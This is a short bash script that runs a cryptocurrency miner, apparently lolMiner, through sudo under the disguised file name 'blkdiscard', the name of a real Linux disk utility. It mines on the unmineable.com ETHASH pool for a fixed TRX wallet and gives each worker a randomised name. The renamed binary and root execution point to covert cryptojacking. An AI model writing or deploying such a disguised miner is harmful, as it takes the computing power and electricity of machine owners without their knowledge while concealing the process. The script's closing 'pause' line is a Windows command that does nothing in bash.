#!/bin/bash

cd "$(dirname "$0")"

chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:THL6Jgj9rFPPYBdAE45nRFwfRTgqqRZ9e4.$(echo Harry-$(shuf -i 1-9999 -n 1)) --ethstratum ETHPROXY
pause
